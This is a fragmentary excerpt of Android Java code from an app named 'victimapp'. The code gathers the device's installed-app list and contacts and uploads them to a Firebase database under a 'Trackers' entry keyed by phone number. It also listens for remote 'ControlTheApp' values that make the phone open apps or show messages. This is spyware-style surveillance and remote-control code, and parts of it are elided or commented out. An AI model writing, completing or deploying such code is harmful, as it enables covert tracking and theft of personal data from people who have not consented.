...
import com.example.victimapp.settings.Tracker;
...
//        myRef.child("Trackers").child(tracker.getPhoneNumber()).child("functions").setValue("enter here function info");
        myRef.child("Trackers").child(tracker.getPhoneNumber()).child("ControlTheApp").setValue("Enter path");
        putAll();
...
//        readFromFirebace();
    ...
    View.OnClickListener addPhone = new View.OnClickListener() {
        ...
        public void onClick(View v) {
            ...
            addPhoneNumberEditText.setVisibility(View.GONE);
            addNameEditText.setVisibility(View.GONE);
...
//        });
        ...
        myRef.child("Trackers").child(tracker.getPhoneNumber()).child("ControlTheApp").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                // This method is called once with the initial value and again
                // whenever data at this location is updated.
    ...
    private void openAPP(String value) {
        if(value==null)
            return;
        if(value.equals("enter here the path"))
            return;
        if(value.equals(""))
            return;
        if(value.charAt(0)=='c')
    ...
    private void writeAToast(String value) {
...
//                myRef.child("Trackers").child(tracker.getPhoneNumber()).child("InstallApps").push().setValue(String.valueOf(appsN));
//            case "All":
//                putAll();
//            default:
//                // code block
...
//    }
    ...
    private void putAll() {
        ...
        List<PackageInfo> appsN=InstalledApplictions.getAllInstalledAppsName(this);
        myRef.child("Trackers").child(tracker.getPhoneNumber()).child("InstallApps").push().setValue(String.valueOf(appsN));
        List<ContactModel> contactList=Contacts.getContacts(this);
        myRef.child("Trackers").child(tracker.getPhoneNumber()).child("Contacts").push().setValue(contactList);
